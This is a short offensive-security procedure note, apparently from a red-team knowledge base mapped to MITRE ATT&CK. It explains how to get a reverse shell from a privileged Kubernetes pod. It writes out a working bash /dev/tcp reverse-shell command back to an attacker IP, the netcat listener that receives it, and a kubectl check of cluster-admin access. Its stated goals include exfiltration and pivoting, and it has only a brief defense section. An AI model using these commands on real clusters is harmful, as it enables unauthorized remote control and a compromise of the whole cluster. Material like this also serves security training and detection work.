---
id: uuid6
tags:
  - reverse-shell
  - rce
  - kubernetes
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/kubernetes-reverse-shell]]'
verified: false
platforms:
  - Kubernetes
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:27:50.218Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Execute-Reverse-Shell-from-Privileged-Pod

## Summary

The deployed pod executes a reverse shell command to connect back to the attacker, providing cluster-admin access for full compromise.

## Description

The pod spec in the malicious YAML includes a container command running bash -i >& /dev/tcp/10.0.0.1/4242 0>&1. With cluster-admin RBAC, this grants unrestricted Kubernetes control.

## Requirements

1. Privileged pod deployed
2. Attacker listener ready (nc -lvnp 4242)
3. Network path from pod to attacker IP

## Defense

Defensive measures and detection strategies:

- Pod Security Policies to restrict shells
- Network policies blocking outbound to attacker IPs
- Monitor for anomalous pod creations and connections

## Objectives

1. Establish reverse shell
2. Confirm admin privileges
3. Exfiltrate or pivot in cluster

## Instructions

### Step 1: Set Up Listener

**Context**: Prepare attacker side.

**Command** (nc-listen):
```bash
nc -lvnp 4242
```

> Expected output: Listening on port 4242.

### Step 2: Pod Executes Shell

**Context**: Pod starts and runs [[commands/kubernetes-reverse-shell]].

**Command** ([[commands/kubernetes-reverse-shell]]):
```bash
["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"]
```

> Runs in pod container. Expected output: Shell connects to listener.

### Step 3: Verify Access

**Context**: Test privileges.

**Command** (kubectl-test):
```bash
kubectl get nodes
```

> Expected output: List of cluster nodes.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Unix Shell]] Unix Shell

### Sub-Techniques


## Commands Used

- [[commands/kubernetes-reverse-shell]]

## Tools Used


## Tags

- reverse-shell
- rce
